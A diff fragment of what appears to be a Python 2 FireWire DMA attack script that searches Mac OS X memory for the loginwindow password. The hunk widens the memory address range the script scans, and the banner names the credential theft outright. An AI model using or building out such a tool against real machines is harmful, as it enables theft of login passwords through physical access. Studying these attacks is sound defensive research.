@@ -42,8 +42,8 @@ devices = fw.scanbus()
 def format_guid(i):
     return ':'.join(["".join(x) for x in zip(("%016x" % i)[::2], ("%016x" % i)[1::2])])
 
-start = 0x10000000L
-end =   0x20000000L
+start = 0x00100000L
+end =   0x80000000L
 
 print "Mac OS X loginwindow.app password finder through"
 print "a Firewire attack."
